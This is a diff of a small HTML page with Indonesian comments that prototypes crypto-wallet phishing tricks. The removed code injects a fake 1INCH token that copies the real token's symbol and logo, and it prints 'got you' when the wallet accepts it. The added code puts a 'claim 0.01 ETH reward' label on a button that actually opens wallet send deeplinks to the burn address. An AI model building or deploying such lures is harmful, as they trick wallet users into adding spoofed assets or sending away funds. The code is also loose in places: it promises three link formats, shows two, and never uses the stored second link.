@@ -1,33 +1,24 @@
 <!DOCTYPE html>
 <html>
 <body>
-<button onclick="tambah()">Claim Token 1INCH - Tambah ke Wallet</button>
+<button onclick="kirim()">Claim Hadiah - Klaim 0.01 ETH</button>
 <pre id="o"></pre>
 <script>
-async function tambah(){
-  let out = document.getElementById('o');
-  try{
-    // Ini token PALSU, contract-nya alamat dummy, tapi nama + simbolnya dibuat sama kayak asli
-    let res = await window.ethereum.request({
-      method: 'wallet_watchAsset',
-      params: {
-        type: 'ERC20',
-        options: {
-          address: '0x000000000000000000000000000000000000dEaD',
-          symbol: '1INCH',
-          decimals: 18,
-          image: 'https://1inch.io/img/favicon.ico'
-        }
-      }
-    });
-    if(res){
-      out.innerText = "KENA! Token palsu ke-tambah ke wallet lu. Cek di daftar token lu, ada 1INCH palsu sekarang?";
-    }else{
-      out.innerText = "Ditolak user / gagal.";
-    }
-  }catch(e){
-    out.innerText = "Error: " + e.message;
-  }
+function kirim(){
+  document.getElementById('o').innerText = "Nyoba buka form Send...";
+  // Coba 3 format deeplink send yang biasa dipake wallet
+  // Format 1: 1inch native
+  let url1 = "1inch://send?to=0x000000000000000000000000000000000000dEaD&amount=0.01&token=ETH";
+  // Format 2: ethereum pay
+  let url2 = "ethereum:0x000000000000000000000000000000000000dEaD?value=10000000000000000";
+  
+  // Kita coba satu-satu, yang pertama dulu
+  window.location.href = url1;
+  setTimeout(()=>{
+    document.getElementById('o').innerText = "Kalo gak terjadi apa-apa, coba Format 2...\nKlik tombol lagi buat coba Format 2.";
+    // Simpen format 2 buat klik kedua
+    window._next = url2;
+  }, 1500);
 }
 </script>
 </body>
